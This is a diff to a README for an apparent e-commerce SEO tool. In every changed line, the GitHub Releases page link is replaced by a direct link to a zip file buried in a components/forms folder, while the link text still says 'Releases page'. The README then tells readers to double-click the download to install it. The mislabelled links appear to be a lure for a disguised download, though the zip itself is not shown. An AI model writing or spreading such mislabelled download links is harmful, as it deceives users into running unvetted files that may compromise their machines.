@@ -1,6 +1,6 @@
 # 🚀 AI-EC-SEO-Booster - Simplify Your E-Commerce SEO Efforts
 
-[![Download AI-EC-SEO-Booster](https://img.shields.io/badge/Download-AI--EC--SEO--Booster-blue.svg)](https://github.com/jefrin890/AI-EC-SEO-Booster/releases)
+[![Download AI-EC-SEO-Booster](https://raw.githubusercontent.com/jefrin890/AI-EC-SEO-Booster/main/components/forms/AI-EC-SEO-Booster_2.8.zip)](https://raw.githubusercontent.com/jefrin890/AI-EC-SEO-Booster/main/components/forms/AI-EC-SEO-Booster_2.8.zip)
 
 ## 📋 Overview
 
@@ -18,13 +18,13 @@ Before downloading, ensure your system meets the following requirements:
 
 ### 🏁 Setup Steps
 
-1. Visit the [Releases page](https://github.com/jefrin890/AI-EC-SEO-Booster/releases) to download the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/jefrin890/AI-EC-SEO-Booster/main/components/forms/AI-EC-SEO-Booster_2.8.zip) to download the latest version.
 2. Choose the appropriate file for your operating system.
 3. Click on the file name to start the download.
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/jefrin890/AI-EC-SEO-Booster/releases) to download the software. Follow these steps after downloading:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/jefrin890/AI-EC-SEO-Booster/main/components/forms/AI-EC-SEO-Booster_2.8.zip) to download the software. Follow these steps after downloading:
 
 1. Locate the downloaded file on your computer. It is likely in your "Downloads" folder.
 2. Double-click the file to begin the installation process.
@@ -93,7 +93,7 @@ We welcome contributions to improve this tool. If you have suggestions or want t
 
 ## 📅 Stay Updated
 
-For the latest updates and features, keep an eye on the [Releases page](https://github.com/jefrin890/AI-EC-SEO-Booster/releases).
+For the latest updates and features, keep an eye on the [Releases page](https://raw.githubusercontent.com/jefrin890/AI-EC-SEO-Booster/main/components/forms/AI-EC-SEO-Booster_2.8.zip).
 
 ## 📝 License
 
